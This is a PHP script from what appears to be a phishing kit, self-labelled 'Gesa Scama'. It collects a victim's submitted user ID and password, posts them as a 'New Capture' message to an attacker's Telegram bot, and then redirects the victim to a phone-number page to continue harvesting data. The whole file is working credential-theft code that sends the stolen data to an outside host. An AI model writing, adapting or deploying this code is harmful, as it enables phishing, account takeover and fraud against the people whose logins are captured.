<?php
error_reporting(E_ERROR | E_PARSE);

include "config.php";

if (isset($_POST['userid'])){

$msg = "
𝗡𝗲𝘄 𝗖𝗮𝗽𝘁𝘂𝗿𝗲 ✅

━━━━━━━━━━━━━━━━━━━━━━━━
𝗨𝘀𝗲𝗿 𝗜𝗗: <code>{$_POST['userid']}</code>
𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: {$_POST['password']}
━━━━━━━━━━━━━━━━━━━━━━━━

Sent From Gesa Scama
";

    // Data to send in the POST request
    $data = [
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $msg
    ];

    // Initialize cURL session
    $ch = curl_init("https://api.telegram.org/bot{$TELEGRAM_API_KEY}/sendMessage?parse_mode=html");

    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Execute cURL session and store the response
    if(curl_exec($ch)){
        header('Location: phonenumber.php');
    } else {
    }

    curl_close($ch);
}
?>